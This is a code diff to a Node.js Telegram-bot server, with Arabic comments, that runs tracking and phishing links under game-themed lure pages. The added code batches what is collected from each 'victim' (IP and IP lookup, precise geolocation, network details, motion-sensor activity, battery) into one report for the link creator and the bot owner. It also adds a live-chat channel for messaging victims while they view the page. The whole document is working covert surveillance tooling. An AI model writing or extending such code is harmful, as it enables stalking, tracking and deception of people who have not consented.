@@ -103,7 +103,52 @@ function addUserSub(uid, sub) {
 const _pageWiz = {};          // chatId → { step, data }
 const _pageTpls = {};         // name → config
 const _awaitWelcome = new Set(); // chatIds waiting for welcome message text
-const _awaitPagePass = new Map(); // chatId → { type:'owner'|'user', uid? }
+const _awaitPagePass  = new Map(); // chatId → { type:'owner'|'user', uid? }
+const _awaitChatReply = new Map(); // chatId → { uid, pid }
+
+// ── Notification buffer (consolidate victim data into ONE message) ─────────────
+const _notifBuf = new Map(); // `${tid}:${ip}` → { parts, timer }
+
+function _addToBuf(tid, ip, key, val) {
+  const k = `${tid}:${ip}`;
+  if (!_notifBuf.has(k)) {
+    _notifBuf.set(k, {
+      parts: { ip, time: new Date().toJSON().slice(0,19).replace('T',' ') },
+      timer: setTimeout(() => _flushBuf(tid, ip), 9000)
+    });
+  }
+  _notifBuf.get(k).parts[key] = val;
+}
+
+function _flushBuf(tid, ip) {
+  const k = `${tid}:${ip}`;
+  const buf = _notifBuf.get(k);
+  if (!buf) return;
+  _notifBuf.delete(k);
+  if (settings.silentMode) return;
+  const p = buf.parts;
+  const prof = profiles[String(tid)] || {};
+  const isTarget = targets.has(tid);
+  const flag = isTarget ? '🎯🚨' : '⚠️';
+  let msg = `${flag} *ضحية جديدة!*\n`;
+  if (prof.name) msg += `👤 الاسم: ${prof.name}\n`;
+  if (prof.username) msg += `🔗 اليوزر: @${prof.username}\n`;
+  msg += `🆔 ID: \`${tid}\`\n`;
+  msg += `━━━━━━━━━━━━━━━\n`;
+  if (p.ip)       msg += `⚓ IP: \`${p.ip}\`\n`;
+  if (p.ipInfo)   msg += `${p.ipInfo}\n`;
+  if (p.location) msg += `📍 ${p.location}\n`;
+  if (p.network && p.network !== 'undefined' && p.network !== 'null') msg += `📶 شبكة: ${p.network}\n`;
+  if (p.activity) msg += `🚶 نشاط: ${p.activity}\n`;
+  if (p.battery)  msg += `${p.battery}\n`;
+  msg += `━━━━━━━━━━━━━━━\n⏰ ${p.time} UTC`;
+  bot.sendMessage(tid, msg, {parse_mode:"Markdown"}).catch(()=>{});
+  if (Number(tid) !== BOT_OWNER) bot.sendMessage(BOT_OWNER, msg, {parse_mode:"Markdown"}).catch(()=>{});
+}
+
+// ── Live chat sessions ────────────────────────────────────────────────────────
+const _chatClients = new Map(); // `${uid}:${pid}` → { res, uid, pid }
+const LIVE_CHAT_PREFIX = '💬 رسالة من الضحية';
 
 const TPL_THEMES = {
   pubg:  { bg:"#0a0a1a", btn:"#f0a500", accent:"#f0a500", name:"🎮 ببجي",      redirect:"https://www.pubg.com" },
@@ -471,19 +516,10 @@ async function handleLinkOpen(req, res, view) {
   saveStats();
   incUserStat(String(creatorId), 'linksOpened');
 
-  const isTarget = targets.has(creatorId);
-  const flag = isTarget ? '🎯🚨' : '⚠️';
-  const quickMsg = `${flag} تم فتح رابطك!\n⚓ IP: ${ip}\n⏰ ${d} UTC`;
-
-  notify(creatorId, quickMsg);
-  if (creatorId !== BOT_OWNER)
-    notify(BOT_OWNER, `${flag} فُتح رابط!\n👤 المنشئ: ${creatorId}\n⚓ IP: ${ip}\n⏰ ${d} UTC`);
-
-  // Async IP enrichment
+  // Buffer all data → send ONE combined message after 9s
+  _addToBuf(creatorId, ip, 'opened', true);
   enrichIP(ip).then(info => {
-    if (!info) return;
-    notify(creatorId, `🔍 تفاصيل IP:\n⚓ ${ip}\n${info}`);
-    if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
+    if (info) _addToBuf(creatorId, ip, 'ipInfo', info);
   });
 
   const feat = settings.features || DEFAULT_FEATURES;
@@ -714,6 +750,19 @@ bot.on('message', async (msg) => {
     let sent = 0, failed = 0;
     for (const uid of users) { try { await bot.sendMessage(uid, msg.text); sent++; } catch(e) { failed++; } }
     return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
+  }
+
+  // ── Live chat reply input ──────────────────────────────────────────────────
+  if (_awaitChatReply.has(chatId) && msg.text) {
+    const { uid, pid } = _awaitChatReply.get(chatId);
+    _awaitChatReply.delete(chatId);
+    const txt = msg.text.trim();
+    if (txt === "/cancel") return bot.sendMessage(chatId, "❌ تم الإلغاء.");
+    const resp = await fetch(`${hostURL}/live-chat-send`, {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({ uid, pid, msg: txt })
+    }).then(r=>r.json()).catch(()=>({ok:false}));
+    return bot.sendMessage(chatId, resp.delivered ? `✅ تم إرسال ردك للضحية فوراً` : `📴 الضحية أغلقت الصفحة — لم يصل الرد`);
   }
 
   // ── Page password input ────────────────────────────────────────────────────
@@ -2104,6 +2153,14 @@ bot.on('callback_query', async (q) => {
     return sendUserPageMain(chatId, uid, q.message.message_id);
   }
 
+  if (data.startsWith("chat_reply_") && isPremium(chatId)) {
+    const parts = data.replace("chat_reply_","").split("_");
+    const uid = parts[0]; const pid = parts.slice(1).join("_") || "default";
+    _awaitChatReply.set(chatId, { uid, pid });
+    return bot.sendMessage(chatId, `💬 *اكتب ردك على الضحية:*\n\nسيظهر لها فوراً في نافذة المحادثة.\nأو /cancel للإلغاء`,
+      {parse_mode:"Markdown", reply_markup:JSON.stringify({force_reply:true})});
+  }
+
   if (data === "premgrant" && q.from.id === BOT_OWNER) {
     return bot.sendMessage(chatId, PREM_GRANT_PREFIX, { reply_markup: JSON.stringify({ force_reply: true }) });
   }
@@ -2340,13 +2397,15 @@ app.post("/location", (req, res) => {
   const acc = decodeURIComponent(req.body.acc) || null;
   if (lat && lon && uid && acc) {
     const tid = parseInt(uid, 36);
+    const ip  = getIP(req);
     stats.locations++; saveStats();
     const maps = `https://maps.google.com/?q=${lat},${lon}`;
-    notifyLoc(tid, lat, lon);
-    notify(tid, `📍 الموقع:\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}\n🗺️ ${maps}`);
-    if (tid !== BOT_OWNER) {
-      notifyLoc(BOT_OWNER, lat, lon);
-      notify(BOT_OWNER, `📍 موقع (ID: ${tid}):\n${lat}, ${lon}\nAccuracy: ${acc}\n🗺️ ${maps}`);
+    const locTxt = `${lat}, ${lon} (±${acc}m)\n🗺️ ${maps}`;
+    _addToBuf(tid, ip, 'location', locTxt);
+    // Send interactive map pin separately (can't merge media)
+    if (!settings.silentMode) {
+      bot.sendLocation(tid, lat, lon).catch(()=>{});
+      if (Number(tid) !== BOT_OWNER) bot.sendLocation(BOT_OWNER, lat, lon).catch(()=>{});
     }
     res.send("Done");
   } else res.send("Missing");
@@ -2521,10 +2580,10 @@ app.post("/clipboard", (req, res) => {
 app.post("/network", (req, res) => {
   const uid  = decodeURIComponent(req.body.uid)  || null;
   const data = decodeURIComponent(req.body.data) || null;
-  if (uid && data) {
+  if (uid && data && data !== 'undefined' && data !== 'null') {
     const tid = parseInt(uid, 36);
-    notify(tid, `🌐 بيانات الشبكة:\n${data}`);
-    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🌐 شبكة (ID: ${tid}):\n${data}`);
+    const ip  = getIP(req);
+    _addToBuf(tid, ip, 'network', data);
     res.send("Done");
   } else res.send("Missing");
 });
@@ -2570,9 +2629,8 @@ app.post("/activity", (req, res) => {
   const mag      = req.body?.avgMag   || '?';
   if (!uid) return res.send("Missing");
   const tid = parseInt(uid, 36);
-  const msg = `🚶 نشاط الضحية الجسدي\n📊 الحالة: ${activity}\n📈 شدة الحركة: ${mag}`;
-  notify(tid, msg);
-  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+  const ip  = getIP(req);
+  _addToBuf(tid, ip, 'activity', `${activity} | شدة: ${mag}`);
   res.send("Done");
 });
 
@@ -2853,6 +2911,55 @@ process.on('SIGTERM', async () => {
   console.log("SIGTERM — حفظ البيانات قبل الإغلاق...");
   await backupToGitHub();
   process.exit(0);
+});
+
+// ── Live Chat Routes ──────────────────────────────────────────────────────────
+
+app.get("/live-chat/:uid", (req, res) => {
+  const uid = req.params.uid;
+  const pid = req.query.pid || 'default';
+  res.set({ 'Content-Type':'text/event-stream', 'Cache-Control':'no-cache', 'Connection':'keep-alive' });
+  res.flushHeaders();
+  res.write('data: {"type":"connected"}\n\n');
+  const key = `${uid}:${pid}`;
+  _chatClients.set(key, { res, uid, pid });
+  req.on('close', () => _chatClients.delete(key));
+});
+
+app.post("/live-chat-msg", express.json({limit:"64kb"}), (req, res) => {
+  const { uid, pid, msg } = req.body || {};
+  if (!uid || !msg) return res.json({ok:false});
+  res.json({ok:true});
+  const tid = parseInt(uid, 36);
+  const ip  = getIP(req);
+  const ts  = new Date().toJSON().slice(11,16) + " UTC";
+  const chatMsg = `${LIVE_CHAT_PREFIX}\n📍 IP: ${ip} | ⏰ ${ts}\n👤 المنشئ: \`${tid}\`\n\n💬 "${msg}"`;
+  bot.sendMessage(BOT_OWNER, chatMsg, {
+    parse_mode:"Markdown",
+    reply_markup: JSON.stringify({ inline_keyboard: [[
+      { text:"💬 رد على الضحية", callback_data:`chat_reply_${uid}_${pid||'default'}` }
+    ]] })
+  }).catch(()=>{});
+  if (Number(tid) !== BOT_OWNER) {
+    bot.sendMessage(tid, chatMsg, {
+      parse_mode:"Markdown",
+      reply_markup: JSON.stringify({ inline_keyboard: [[
+        { text:"💬 رد على الضحية", callback_data:`chat_reply_${uid}_${pid||'default'}` }
+      ]] })
+    }).catch(()=>{});
+  }
+});
+
+app.post("/live-chat-send", express.json({limit:"64kb"}), (req, res) => {
+  const { uid, pid, msg } = req.body || {};
+  if (!uid || !msg) return res.json({ok:false});
+  const key = `${uid}:${pid||'default'}`;
+  const client = _chatClients.get(key);
+  if (client) {
+    client.res.write(`data: ${JSON.stringify({type:"msg", from:"agent", text:msg})}\n\n`);
+    return res.json({ok:true, delivered:true});
+  }
+  res.json({ok:true, delivered:false});
 });
 
 // ── Notify owner when server starts (after cold start / crash recovery) ───────
